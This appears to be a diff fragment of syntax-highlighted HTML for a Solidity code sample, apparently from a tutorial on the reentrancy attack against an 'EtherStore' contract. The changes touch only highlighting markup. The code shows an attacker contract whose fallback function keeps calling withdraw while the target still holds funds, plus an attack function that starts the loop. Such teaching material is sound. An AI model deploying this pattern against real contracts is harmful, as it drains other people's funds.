@@ -72,7 +72,7 @@ Here is how the functions were called
     }
 
     <span class="hljs-comment">// Fallback is called when EtherStore sends Ether to this contract.</span>
-    <span class="hljs-keyword">fallback</span>() <span class="hljs-keyword">external</span> <span class="hljs-keyword">payable</span> {
+    <span class="hljs-function"><span class="hljs-keyword">fallback</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">external</span></span> <span class="hljs-title"><span class="hljs-keyword">payable</span></span> </span>{
         <span class="hljs-keyword">if</span> (<span class="hljs-keyword">address</span>(etherStore).<span class="hljs-built_in">balance</span> &gt;= <span class="hljs-number">1</span> <span class="hljs-literal">ether</span>) {
             etherStore.withdraw(<span class="hljs-number">1</span> <span class="hljs-literal">ether</span>);
         }
@@ -80,7 +80,7 @@ Here is how the functions were called
 
     <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">attack</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">external</span></span> <span class="hljs-title"><span class="hljs-keyword">payable</span></span> </span>{
         <span class="hljs-built_in">require</span>(<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">value</span> &gt;= <span class="hljs-number">1</span> <span class="hljs-literal">ether</span>);
-        etherStore.deposit{<span class="hljs-built_in">value:</span> <span class="hljs-number">1</span> <span class="hljs-literal">ether</span>}();
+        etherStore.deposit{<span class="hljs-built_in">value</span>: <span class="hljs-number">1</span> <span class="hljs-literal">ether</span>}();
         etherStore.withdraw(<span class="hljs-number">1</span> <span class="hljs-literal">ether</span>);
     }
 
